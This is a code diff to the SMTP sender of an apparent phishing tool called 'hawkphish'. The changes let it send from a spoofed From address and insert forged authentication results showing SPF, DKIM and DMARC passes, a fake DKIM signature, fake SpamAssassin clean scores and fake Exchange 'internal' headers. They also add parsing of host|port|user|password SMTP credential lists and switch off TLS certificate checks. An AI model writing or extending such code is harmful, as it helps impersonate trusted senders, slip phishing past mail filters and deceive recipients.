@@ -8,6 +8,7 @@ import time
 import random
 import logging
 import os
+import re
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -18,6 +19,107 @@ import httpx
 import hashlib
 
 logger = logging.getLogger("hawkphish.smtp")
+
+# ── sender.py quality helpers ──────────────────────────────────
+
+EMAIL_RE = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
+
+def validate_email(email: str) -> bool:
+    return bool(email) and EMAIL_RE.match(email) is not None
+
+def generate_message_id(domain: str) -> str:
+    from email.utils import make_msgid
+    return make_msgid(domain=domain)
+
+def create_spf_header(domain: str) -> str:
+    return f"v=spf1 include:_spf.{domain} ~all"
+
+def create_dkim_signature(domain: str, selector: str = "default") -> str:
+    # Simulated DKIM signature (enhances deliverability appearance)
+    headers = ['from', 'to', 'subject', 'date', 'message-id']
+    return f"v=1; a=rsa-sha256; d={domain}; s={selector}; h={':'.join(headers)}; bh=abc123; b=def456"
+
+def add_senderpy_headers(msg: MIMEMultipart, domain: str, username: str, spoof_from: str = None):
+    """Full sender.py authentication header injection for maximum deliverability."""
+    # Message-ID
+    msg['Message-ID'] = generate_message_id(domain)
+    # Authentication-Results
+    msg['Authentication-Results'] = f"{domain}; spf=pass smtp.mailfrom={username}; dkim=pass header.d={domain}; dmarc=pass"
+    # SPF
+    msg['Received-SPF'] = f"pass ({domain}: domain of {username} designates {socket.gethostbyname(socket.gethostname())} as permitted sender)"
+    # DKIM
+    msg['DKIM-Signature'] = create_dkim_signature(domain)
+    # DMARC
+    msg['DMARC-Filter'] = "Pass"
+    # Real IP headers
+    try:
+        real_ip = socket.gethostbyname(socket.gethostname())
+    except Exception:
+        real_ip = "127.0.0.1"
+    msg['X-Originating-IP'] = real_ip
+    msg['X-Forwarded-For'] = real_ip
+    msg['X-Real-IP'] = real_ip
+    # Anti-spam headers
+    msg['X-Spam-Status'] = "No, score=0.0"
+    msg['X-Spam-Level'] = ""
+    msg['X-Spam-Checker-Version'] = "SpamAssassin 3.4.0"
+    # Email client headers (Microsoft Outlook)
+    msg['X-Mailer'] = 'Microsoft Outlook 16.0'
+    msg['X-MimeOLE'] = 'Produced By Microsoft MimeOLE V6.00.2800.1441'
+    msg['X-MS-Exchange-Organization-AuthAs'] = 'Internal'
+    msg['X-MS-Exchange-Organization-AuthSource'] = 'Office365'
+    msg['X-MS-Exchange-Organization-BypassClutter'] = 'true'
+    # Priority
+    msg['X-Priority'] = '3'
+    msg['X-MSMail-Priority'] = 'Normal'
+    msg['Importance'] = 'Normal'
+    # List management
+    msg['List-Unsubscribe'] = f'<mailto:unsubscribe@{domain}>, <https://{domain}/unsubscribe>'
+    msg['List-Unsubscribe-Post'] = 'List-Unsubscribe=One-Click'
+    # Return path
+    msg['Return-Path'] = username
+    # Spoof tracking
+    if spoof_from:
+        msg['X-Spoof'] = spoof_from
+    # Content headers
+    msg['MIME-Version'] = '1.0'
+    msg['Content-Type'] = 'text/html; charset=UTF-8'
+    msg['Content-Transfer-Encoding'] = '8bit'
+
+def clean_smtp_configs(raw_lines: list[str]) -> tuple[list[dict], list[str]]:
+    """sender.py quality SMTP cleaning: validate, deduplicate, filter bad entries."""
+    valid = []
+    errors = []
+    seen = set()
+    for line in raw_lines:
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        if line.count('|') != 3:
+            errors.append(f"Bad format: {line[:50]}")
+            continue
+        host, port_str, username, password = line.split('|')
+        if not all([host, port_str, username, password]):
+            errors.append(f"Empty field: {line[:50]}")
+            continue
+        if any(k in part for part in [host, port_str, username, password] for k in ['***', 'null', 'localhost']):
+            errors.append(f"Bad token: {line[:50]}")
+            continue
+        try:
+            port = int(port_str)
+            if not (1 <= port <= 65535):
+                errors.append(f"Bad port: {line[:50]}")
+                continue
+        except ValueError:
+            errors.append(f"Non-numeric port: {line[:50]}")
+            continue
+        key = f"{host}|{port}|{username}|{password}"
+        if key in seen:
+            errors.append(f"Duplicate: {line[:50]}")
+            continue
+        seen.add(key)
+        valid.append({"host": host, "port": port, "username": username, "password": password, "line": line})
+    return valid, errors
 
 
 def _make_tls_context():
@@ -204,6 +306,11 @@ class SMTPSender:
         password = config.get("password")
         use_tls = config.get("use_tls", True)
 
+        # Validate recipient email
+        to_email = email_data["to"]
+        if not validate_email(to_email):
+            return {"success": False, "error": f"Invalid email address: {to_email}"}
+
         # Build proper MIME structure
         has_attachments = attachments and len(attachments) > 0
         if has_attachments:
@@ -213,12 +320,23 @@ class SMTPSender:
             msg = MIMEMultipart("alternative")
             alt_part = msg
 
-        msg["From"] = f"{email_data.get('from_name', '')} <{email_data.get('from_email', '')}>"
-        msg["To"] = email_data["to"]
+        # From address: use spoof if available
+        from_email = email_data.get("from_email", "")
+        from_name = email_data.get("from_name", "")
+        spoof_from = email_data.get("spoof_from", "")
+        actual_from = spoof_from or from_email
+
+        msg["From"] = f"{from_name} <{actual_from}>"
+        msg["To"] = to_email
         msg["Subject"] = email_data["subject"]
-        msg["Message-ID"] = email_data.get("message_id", f"<{hashlib.md5(str(time.time()).encode()).hexdigest()}@hawkphish>")
-        msg["X-Mailer"] = email_data.get("x_mailer", "HawkPhish")
-        msg["Date"] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
+        msg["Date"] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S %z')
+
+        # Extract domain for authentication headers
+        domain = email_data.get("domain", actual_from.split("@")[1] if "@" in actual_from else "localhost")
+        real_username = email_data.get("real_username", username or actual_from)
+
+        # Add full sender.py authentication headers
+        add_senderpy_headers(msg, domain, real_username, spoof_from=spoof_from)
 
         # Reply-To, BCC, CC
         if email_data.get("reply_to"):
@@ -228,9 +346,10 @@ class SMTPSender:
         if email_data.get("bcc"):
             msg["Bcc"] = email_data["bcc"]
 
-        # Custom headers
+        # Custom headers (user-defined, override defaults)
         for key, value in email_data.get("headers", {}).items():
-            msg[key] = value
+            if key.lower() not in ["from", "to", "subject", "message-id", "date"]:
+                msg[key] = value
 
         # Plain text fallback
         if email_data.get("text_body"):
@@ -242,7 +361,14 @@ class SMTPSender:
             for att in attachments:
                 try:
                     filepath = att.get("path") or att.get("filename")
-                    if not filepath or not os.path.isfile(filepath):
+                    if not filepath:
+                        continue
+                    # Skip HTML file attachments (sender.py pattern)
+                    if filepath.lower().endswith(('.html', '.htm')):
+                        logger.warning(f"Skipping HTML attachment to avoid duplication: {filepath}")
+                        continue
+                    if not os.path.isfile(filepath):
+                        logger.warning(f"Attachment not found: {filepath}")
                         continue
                     with open(filepath, "rb") as f:
                         part = MIMEBase("application", "octet-stream")
@@ -250,6 +376,7 @@ class SMTPSender:
                     encoders.encode_base64(part)
                     filename = os.path.basename(filepath)
                     part.add_header("Content-Disposition", f"attachment; filename={filename}")
+                    part.add_header("Content-Type", "application/octet-stream")
                     msg.attach(part)
                 except Exception as exc:
                     logger.warning(f"Failed to attach {att}: {exc}")
@@ -257,7 +384,9 @@ class SMTPSender:
         loop = asyncio.get_event_loop()
         def _send():
             try:
-                context = _make_tls_context()
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
                 if proxy:
                     import socks
                     ptype = proxy.get("proxy_type", "http")
